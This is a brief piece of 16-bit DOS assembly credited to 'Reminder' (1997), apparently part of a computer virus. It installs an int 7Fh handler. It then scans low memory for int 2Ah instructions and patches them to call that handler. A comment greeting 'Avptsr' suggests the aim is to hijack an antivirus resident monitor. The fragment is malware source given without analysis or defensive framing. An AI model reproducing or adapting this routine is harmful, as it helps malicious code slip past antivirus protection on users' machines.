; (c) Reminder (1997)

entry7f:		; bl/2 = ah , al = al
int 2ah		; Hello Avptsr ;))

push bp
mov bp,sp
cmp byte ptr [bp+9],30h
jnz hook
cmp di,';)'
jnz hook

mov bx,si
xchg bl,bh
shl bl,1
xor bh,bh

quit7f:
pop bp
retf 2


hook:
call int_21
jmp quit7f


lea dx,entry7f
mov ax,257fh
int 21h

;---
cld
xor ax,ax
mov es,ax
mov di,200h
mov cx,0ffffh-200-2
@a1:
mov al,0cdh
repne scasb
jne sux
mov al,2ah
scasb
jne @a1

mov al,7fh
dec di
stosb
jmp @a1
sux:
;---
